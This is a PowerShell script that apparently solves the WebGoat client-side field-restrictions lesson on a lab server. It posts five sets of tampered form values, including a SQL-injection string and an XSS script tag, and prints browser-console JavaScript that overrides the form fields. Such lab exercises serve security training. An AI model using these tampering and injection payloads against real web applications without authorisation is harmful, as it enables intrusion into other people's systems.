# ============================================================
# Client-Side Field Restrictions Bypass Attack
# ============================================================

$webGoatUrl = "http://192.168.254.112:8001"
$sessionCookie = "25A6B220A4CB5215EBBE7B31E207B4B1"

Write-Host "=====================================" -ForegroundColor Cyan
Write-Host "Field Restrictions Bypass Attack" -ForegroundColor Cyan
Write-Host "=====================================" -ForegroundColor Cyan
Write-Host ""

$headers = @{
    "Content-Type" = "application/x-www-form-urlencoded"
    "Cookie" = "JSESSIONID=$sessionCookie"
}

# Different payloads to try
$payloads = @(
    @{
        name = "Bypass 1: Invalid options"
        data = @{
            select = "option3"
            radio = "option3"
            checkbox = "different"
            shortInput = "thisIsLongerThan5Characters"
            readOnlyInput = "hacked"
        }
    },
    @{
        name = "Bypass 2: Unexpected values"
        data = @{
            select = "admin"
            radio = "both"
            checkbox = "yes"
            shortInput = "1234567890"
            readOnlyInput = "modified"
        }
    },
    @{
        name = "Bypass 3: Injection attempts"
        data = @{
            select = "option1' OR '1'='1"
            radio = "<script>alert('xss')</script>"
            checkbox = "true"
            shortInput = "verylonginputexceedingmaximum"
            readOnlyInput = "pwned"
        }
    },
    @{
        name = "Bypass 4: Empty/null values"
        data = @{
            select = ""
            radio = ""
            checkbox = ""
            shortInput = "toolongvalue"
            readOnlyInput = "changed"
        }
    },
    @{
        name = "Bypass 5: Numeric values"
        data = @{
            select = "999"
            radio = "0"
            checkbox = "1"
            shortInput = "123456789012345"
            readOnlyInput = "000000"
        }
    }
)

foreach ($payload in $payloads) {
    Write-Host "=====================================" -ForegroundColor Yellow
    Write-Host "[Testing] $($payload.name)" -ForegroundColor Yellow
    Write-Host ""
    
    # Show what we're sending
    Write-Host "Payload values:" -ForegroundColor Cyan
    foreach ($key in $payload.data.Keys) {
        $value = $payload.data[$key]
        Write-Host "  $key = $value" -ForegroundColor White
    }
    Write-Host ""
    
    # Convert hashtable to URL-encoded form data
    $bodyParts = @()
    foreach ($key in $payload.data.Keys) {
        $value = [System.Web.HttpUtility]::UrlEncode($payload.data[$key])
        $bodyParts += "$key=$value"
    }
    $body = $bodyParts -join "&"
    
    try {
        $response = Invoke-WebRequest `
            -Uri "$webGoatUrl/WebGoat/BypassRestrictions/FieldRestrictions" `
            -Method POST `
            -Headers $headers `
            -Body $body `
            -UseBasicParsing
        
        $result = $response.Content | ConvertFrom-Json
        
        Write-Host "Response:" -ForegroundColor Green
        Write-Host "  Feedback: $($result.feedback)" -ForegroundColor White
        Write-Host "  Lesson Completed: $($result.lessonCompleted)" -ForegroundColor White
        Write-Host ""
        
        if ($result.output) {
            Write-Host "Output:" -ForegroundColor Cyan
            Write-Host "  $($result.output)" -ForegroundColor White
            Write-Host ""
        }
        
        if ($result.lessonCompleted -eq $true) {
            Write-Host "================================================" -ForegroundColor Green
            Write-Host "SUCCESS!" -ForegroundColor Green
            Write-Host "================================================" -ForegroundColor Green
            Write-Host "Winning payload:" -ForegroundColor White
            foreach ($key in $payload.data.Keys) {
                Write-Host "  $key = $($payload.data[$key])" -ForegroundColor Cyan
            }
            Write-Host ""
            exit 0
        }
        
    } catch {
        Write-Host "[ERROR] Request failed: $_" -ForegroundColor Red
        Write-Host ""
    }
    
    Start-Sleep -Milliseconds 500
}

Write-Host ""
Write-Host "=====================================" -ForegroundColor Cyan
Write-Host "Browser Console Method" -ForegroundColor Cyan
Write-Host "=====================================" -ForegroundColor Cyan
Write-Host ""
Write-Host "If PowerShell didn't work, try in browser console (F12):" -ForegroundColor White
Write-Host ""
Write-Host "// Copy and paste this into browser console:" -ForegroundColor Yellow
Write-Host ""
Write-Host "document.querySelector('select[name=`"select`"]').value = 'option3';" -ForegroundColor Cyan
Write-Host "document.querySelector('input[name=`"radio`"]:checked').value = 'option3';" -ForegroundColor Cyan
Write-Host "document.querySelector('input[name=`"checkbox`"]').value = 'different';" -ForegroundColor Cyan
Write-Host "document.querySelector('input[name=`"shortInput`"]').value = 'thisIsLongerThan5Characters';" -ForegroundColor Cyan
Write-Host "document.querySelector('input[name=`"readOnlyInput`"]').value = 'hacked';" -ForegroundColor Cyan
Write-Host "document.querySelector('form[name=`"fieldRestrictions`"]').submit();" -ForegroundColor Cyan
Write-Host ""
Write-Host "Then press Enter to execute!" -ForegroundColor Yellow
Write-Host ""
